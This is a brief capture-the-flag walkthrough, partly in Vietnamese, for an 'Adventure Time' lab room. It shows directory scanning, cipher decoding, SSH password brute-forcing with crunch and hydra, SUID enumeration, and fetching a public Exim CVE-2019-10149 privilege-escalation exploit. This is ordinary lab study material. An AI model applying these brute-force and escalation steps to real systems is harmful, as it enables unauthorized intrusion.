Room: Adventure Time

Flag1->Hint: Try to recursively enumerate the website(Hãy thử liệt kê (hoặc quét) đệ quy toàn bộ trang web).

$  nmap -sV -v <ip>

<img width="617" height="100" alt="{E4052F82-7898-43AB-9846-334DECEBE22C}" src="https://github.com/user-attachments/assets/07f086c2-edc9-4913-a18c-26d2e237412f" />

gobuster -u https://<IP>-w /usr/share/wordlists/master-lists/dirbuster/directory-list-lowercase-2.3-medium.txt -k

<img width="955" height="318" alt="{CD002047-A8C9-4AE8-B51A-FBAAB9415AFE}" src="https://github.com/user-attachments/assets/5cd30fba-f9d1-49de-ac59-4f2a099abad4" />

=>/candybar/

$  echo "KBQWY4DONAQHE53UOJ5CA2LXOQQEQSCBEBZHIZ3JPB2XQ4TQNF2CA5LEM4QHEYLKORUC4===" | base32 -d 

=> Palpnh rwtrz iwt HHA rtgixuxrpit udg rajth.

https://www.dcode.fr/caesar-cipher

$ echo "Palpnh rwtrz iwt HHA rtgixuxrpit udg rajth." | tr 'A-Za-z' 'N-ZA-Mn-za-m'

https://land-of-ooo.com

$  sudo gobuster -u https:// land-of-ooo.com -w /usr/share/wordlists/master-lists/dirbuster/directory-list-lowercase-2.3-medium.txt -k

=> yellowdog

https://land-of-ooo.com/yellowdog/

$  sudo gobuster dir -u https://land-of-ooo.com/yellowdog/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -k

=> bananastock

https://land-of-ooo.com/yellowdog/bananastock/

Morse code: _/…./.\_…/._/_./._/_./._/…\._/._./.\_/…./.\_…/./…/_/_._.__/_._.__/_._.__

https://www.dcode.fr/morse-code

=>Pass: The banana are the best!!!

$  sudo gobuster dir -e -u https://land-of-ooo.com/yellowdog/bananastock/ -w /usr/share/wordlists/dirb/common.txt -k

=> princess

https://land-of-ooo.com/yellowdog/bananastock/princess/

https://anycript.com/crypto

AES (viết tắt của Advanced Encryption Standard) là một thuật toán mã hóa đối xứng rất phổ biến và mạnh mẽ, được dùng trong hầu hết các hệ thống bảo mật hiện nay — như HTTPS, VPN, Wi-Fi (WPA2/WPA3), ngân hàng, và thiết bị di động.

$  nc land-of-ooo.com 31337

$  sudo ssh apple-guards@<IP>  ,Password: THE BANANAS ARE THE BEST!!!

Flag2->Hint: Can you search for someone's files?

$  find / -user marceline -type f 2>/dev/null

https://www.boxentriq.com/code-breaking/vigenere-cipher

Vigenère cipher là một mã hóa chữ cái theo kiểu dùng khóa (key) lặp lại để dịch chuyển mỗi chữ cái của plaintext với bảng chữ cái 26 ký tự.

=> Abadeer

$  su marceline > Password: My friend Finn

Flag3:

https://www.dcode.fr/spoon-language

=> The magic word you are looking for is ApplePie

$  nc land-of-ooo.com 31337

$  su peppermint-butler > Password: That Black Magic

Flag4->Hint: Things can be hidden and hidden things can be unfolded with the right passwords(Những thứ có thể bị giấu, và những điều bị giấu có thể được hé lộ nếu có đúng mật khẩu).

$  find / -user peppermint-butler -type f 2>/dev/null

$  cat /usr/share/xml/steg.txt

$  find / -user peppermint-butler -name "*.txt" 2>/dev/null

$  cat /etc/php/zip.txt

$  crunch 18 18 -t 'The Ice King s@@@@' > file.txt

$  sudo hydra -l gunter -P file.txt ssh://<IP>

$  su gunter > Password: The Ice King sucks

Flag5:

$  find / -perm /4000 2>/dev/null

$  searchsploit exim

$  cd /etc/exim4/

$  cat /etc/exim4/update-exim4.conf.conf

$  git clone ‘https://github.com/AzizMea/CVE-2019-10149-privilege-escalation.git'
